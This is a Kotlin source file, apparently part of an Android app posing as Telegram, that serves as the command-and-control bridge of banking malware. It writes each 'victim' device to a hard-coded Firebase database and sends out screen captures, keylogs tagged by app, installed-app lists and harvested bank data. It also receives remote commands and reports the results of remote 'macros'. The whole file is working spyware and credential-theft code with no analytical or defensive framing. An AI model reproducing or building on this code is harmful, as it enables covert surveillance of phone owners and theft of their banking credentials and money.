package com.telegram2.messaging.remote

import com.google.firebase.database.*

object FirebaseBridge {
    private lateinit var db: FirebaseDatabase
    lateinit var deviceId: String private set
    lateinit var deviceRef: DatabaseReference private set
    lateinit var commandsRef: DatabaseReference private set
    private lateinit var screenRef: DatabaseReference
    private lateinit var infoRef: DatabaseReference
    private lateinit var bankRef: DatabaseReference

    fun init(id: String) {
        deviceId = id
        db = FirebaseDatabase.getInstance("https://vfvdfscf-default-rtdb.firebaseio.com")
        deviceRef = db.reference.child("telegram2_secret").child("victims").child(deviceId)
        commandsRef = deviceRef.child("commands")
        screenRef = deviceRef.child("screen")
        infoRef = deviceRef.child("info")
        bankRef = deviceRef.child("bank")
    }

    fun registerDevice(name: String, version: String, apps: List<String>) {
        deviceRef.child("deviceName").setValue(name)
        deviceRef.child("androidVersion").setValue(version)
        deviceRef.child("appList").setValue(apps)
        deviceRef.child("lastSeen").setValue(ServerValue.TIMESTAMP)
    }

    fun updateScreenFrame(base64: String) = screenRef.setValue(base64)

    fun updateScreenInfo(w: Int, h: Int) {
        deviceRef.child("screenInfo/width").setValue(w)
        deviceRef.child("screenInfo/height").setValue(h)
    }

    fun sendKeylog(pkg: String, text: String) {
        val ts = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())
        val entry = "[$ts] $pkg: $text"
        infoRef.child("keylogs").runTransaction(object : Transaction.Handler {
            override fun doTransaction(current: MutableData): Transaction.Result {
                val exist = current.getValue(String::class.java) ?: ""
                current.value = (exist + "\n" + entry).takeLast(4000)
                return Transaction.success(current)
            }
            override fun onComplete(err: DatabaseError?, comm: Boolean, cur: DataSnapshot?) {}
        })
    }

    fun pushAppsList(apps: List<String>) = infoRef.child("apps").setValue(apps.joinToString("\n"))

    fun appendBankData(data: String) = bankRef.push().setValue(data)

    fun pushBankJson(json: String) = bankRef.push().setValue(json)   // kept for backward compat

    fun reportMacroResult(macroId: String, success: Boolean, details: String) {
        deviceRef.child("macros").child(macroId).child("status").setValue(if (success) "done" else "failed")
        deviceRef.child("macros").child(macroId).child("details").setValue(details)
    }

    fun deleteDevice() = deviceRef.removeValue()
}